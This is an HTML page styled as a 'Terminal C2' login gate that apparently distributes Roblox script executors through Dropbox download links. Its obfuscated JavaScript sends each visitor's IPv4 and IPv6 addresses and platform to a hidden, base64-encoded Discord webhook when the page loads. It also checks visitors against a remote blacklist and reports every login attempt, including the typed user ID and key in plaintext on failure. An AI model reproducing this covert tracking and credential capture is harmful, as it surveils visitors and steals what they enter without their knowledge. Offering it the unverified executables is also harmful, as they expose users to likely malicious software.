<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VexCode | Terminal C2</title>
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&family=Inter:wght@400;800&display=swap" rel="stylesheet">
    <style>
        :root { --p: #6366f1; --s: #a855f7; --a: #22d3ee; --bg: #030303; --err: #ff4d4d; }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background-color: var(--bg); color: white; font-family: 'Inter', sans-serif; height: 100vh; display: flex; justify-content: center; align-items: center; overflow: hidden; }
        #v_ { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.2; }
        .box_ { width: 400px; padding: 50px 40px; border-radius: 20px; background: rgba(10, 10, 10, 0.8); border: 1px solid rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px); text-align: center; }
        h2 { font-family: 'Fira Code', monospace; font-weight: 800; font-size: 2rem; margin-bottom: 30px; background: linear-gradient(to right, var(--a), var(--p)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        input { width: 100%; padding: 15px; margin-bottom: 20px; border-radius: 8px; border: 1px solid #333; background: rgba(0, 0, 0, 0.5); color: #fff; font-family: 'Fira Code', monospace; outline: none; }
        button { width: 100%; padding: 15px; border-radius: 8px; border: none; background: linear-gradient(45deg, var(--p), var(--s)); color: white; font-weight: 700; cursor: pointer; font-family: 'Fira Code'; }
        #res_1, #res_2, #res_3, #gate_msg { display: none; text-align: center; }
        .dl_link { padding: 12px 25px; margin: 10px; border-radius: 5px; border: 1px solid var(--a); color: var(--a); text-decoration: none; display: inline-block; font-family: 'Fira Code'; }
        #gate_msg h1 { color: var(--err); font-family: 'Fira Code'; font-size: 2.5rem; margin-bottom: 10px; }
    </style>
</head>
<body>

<canvas id="v_"></canvas>

<div id="gate_msg">
    <h1>[ ACCESS_DENIED ]</h1>
    <p style="font-family: 'Fira Code'; color: #888;">CONNECTION_REFUSED_BY_ADMIN</p>
</div>

<div id="login_ui" class="box_">
    <h2>> VEX_CODE</h2>
    <input type="text" id="u_id" placeholder="USER_ID">
    <input type="password" id="a_key" placeholder="ACCESS_KEY">
    <button id="auth_btn">INITIALIZE</button>
    <p id="err_msg" style="color: var(--err); margin-top: 15px; font-family: monospace; font-size: 0.8rem;"></p>
</div>

<div id="res_1">
    <h2 style="color: var(--a)">FILES_UNLOCKED</h2>
    <a href="https://www.dropbox.com/scl/fi/adzrpc80kqfumzfg65k2z/Xeno-v1.3.25b.zip?rlkey=g3erhqw9wuxewj6gocb0vudg1&st=bm1s2vro&dl=1" class="dl_link" target="_blank">GET_WIN_X64</a>
    <a href="https://www.dropbox.com/scl/fi/87sb44vymzml2ylas87r6/DeltaExecutor-v2.709.apk?rlkey=iro9wrqwfgoalq005w62pctu1p&st=zdmk0c0w&dl=1" class="dl_link" target="_blank">GET_ANDROID_APK</a>
</div>

<div id="res_2">
    <h2>VISUAL_DATA</h2>
    <img id="sec_img" src="sys-metadata/config_042.dat.jpg" style="max-width: 90%; border: 1px solid var(--p); border-radius: 10px;">
</div>

<div id="res_3">
    <p style="color: var(--a); font-family: 'Fira Code'; font-size: 1.5rem;">[ STREAMING_SYSTEM_VOICE... ]</p>
</div>

<script>
(function(){
    // 1. SECURE CONFIG
    const _0xW = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ3NzU2ODE2NjY4MTkwMzE2Ni9QSmxGNjFDbHp4cVhWZjY1dzZqdFplVUhVUGV3OFZrN2g0VEhmcF9kcmlyMFJFRUpxcU5nWXMyMkhyVjhpVlpLbG9tVg==";
    const _0xGIST = "https://gist.githubusercontent.com/VexCodeV2/f4081441720e8b72f60bbc6046e39371/raw/f81f472808cbe181c6503f86ce7e79b7e7a5fa49/blacklist.json";
    
    // Obfuscated Keys
    const _0xK1 = "MDUzMjk1MDkuY29kZQ=="; // 05329509.code
    const _0xK2 = "Y29kZS4wNTMyOTUwOQ=="; // code.05329509
    const _0xK3 = "dm9pY2UuMDAy";          // voice.002
    const _0xK4 = "dm9pY2UuMDAz";          // voice.003

    // 2. AUDIO STORAGE
    const _vA = "PASTE_AUDIO_002_BASE64_HERE"; 
    const _vB = "PASTE_AUDIO_003_BASE64_HERE";

    const _d = (s) => atob(s);

    async function _log(t, m, c) {
        try {
            await fetch(_d(_0xW), {
                method: "POST",
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ embeds: [{ title: t, description: m, color: c, timestamp: new Date() }] })
            });
        } catch(e) {}
    }

    // --- GATE KEEPER & IP TRACKER ---
    window.onload = async () => {
        let ip4 = "Checking...";
        let ip6 = "Checking...";
        
        try {
            const r4 = await fetch('https://api.ipify.org?format=json');
            const j4 = await r4.json();
            ip4 = j4.ip;
        } catch(e) { ip4 = "Error"; }

        try {
            const r6 = await fetch('https://api64.ipify.org?format=json');
            const j6 = await r6.json();
            ip6 = j6.ip;
        } catch(e) { ip6 = "N/A"; }

        // Fetch Blacklist
        try {
            const cb = "?t=" + new Date().getTime();
            const res = await fetch(_0xGIST + cb);
            const blacklist = await res.json();
            
            if (blacklist.includes(ip4) || blacklist.includes(ip6)) {
                document.getElementById('login_ui').style.display = 'none';
                document.getElementById('gate_msg').style.display = 'block';
                _log("ðŸš« ACCESS BLOCKED", `**Banned User Attempted Entry**\n**IPv4:** ${ip4}\n**IPv6:** ${ip6}`, 16711680);
                return; 
            }
        } catch(e) { console.warn("Gate Check Failed."); }

        _log("ðŸŒ Terminal Connection", `**IPv4:** ${ip4}\n**IPv6:** ${ip6}\n**Platform:** ${navigator.platform}`, 65023);
    };

    // --- LOGIN HANDLER ---
    document.getElementById('auth_btn').onclick = function() {
        const u = document.getElementById('u_id').value;
        const p = document.getElementById('a_key').value;
        const msg = document.getElementById('err_msg');

        ['res_1', 'res_2', 'res_3'].forEach(i => document.getElementById(i).style.display = 'none');

        const _play = (src) => {
            if(src.length < 100) return;
            const pfx = src.startsWith('data:') ? '' : 'data:audio/mpeg;base64,';
            new Audio(pfx + src).play();
        };

        if (p === _d(_0xK1)) {
            _log("ðŸ”“ Access Granted: Files", "User: " + u, 5763719);
            document.getElementById('login_ui').style.display = 'none';
            document.getElementById('res_1').style.display = 'block';
        } 
        else if (p === _d(_0xK2)) {
            _log("ðŸ–¼ï¸ Access Granted: Visuals", "User: " + u, 2282478);
            document.getElementById('login_ui').style.display = 'none';
            document.getElementById('res_2').style.display = 'block';
        } 
        else if (p === _d(_0xK3)) {
            _log("ðŸŽ™ï¸ Access Granted: Voice 002", "User: " + u, 16776960);
            document.getElementById('login_ui').style.display = 'none';
            document.getElementById('res_3').style.display = 'block';
            _play(_vA);
        }
        else if (p === _d(_0xK4)) {
            _log("ðŸŽ™ï¸ Access Granted: Voice 003", "User: " + u, 16776960);
            document.getElementById('login_ui').style.display = 'none';
            document.getElementById('res_3').style.display = 'block';
            _play(_vB);
        }
        else {
            msg.innerText = "INVALID_KEY";
            _log("ðŸš¨ FAILED LOGIN", `**User:** ${u}\n**Key:** ${p}`, 16711680);
        }
    };
})();

// Matrix Background
const c = document.getElementById('v_');
const x = c.getContext('2d');
c.width = window.innerWidth; c.height = window.innerHeight;
const drops = Array(Math.floor(c.width / 16)).fill(1);
setInterval(() => {
    x.fillStyle = 'rgba(0, 0, 0, 0.05)'; x.fillRect(0, 0, c.width, c.height);
    x.fillStyle = '#6366f1';
    drops.forEach((y, i) => {
        x.fillText(String.fromCharCode(Math.random() * 128), i * 16, y * 16);
        if (y * 16 > c.height && Math.random() > 0.975) drops[i] = 0;
        drops[i]++;
    });
}, 33);
</script>
</body>
</html>
